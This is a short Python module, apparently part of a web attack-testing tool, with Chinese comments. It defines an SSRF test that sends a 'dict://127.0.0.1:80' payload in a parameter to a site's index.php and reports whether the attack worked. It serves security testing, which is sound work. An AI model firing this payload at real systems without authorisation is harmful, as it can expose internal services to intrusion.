import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_ssrf(url, headers, pattern, success, fail, error):
    """
    SSRF攻击测试
    """
    # 定义 SSRF 攻击 payload
    data = {
        "bslotes": "dict://127.0.0.1:80"
    }

    # 构造攻击URL
    attack_url = url + "index.php"
    
    # 发送请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        attack_url, headers, method='GET', params=data
    )
    
    # 处理响应
    return process_attack_response(
        "SSRF攻击", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )
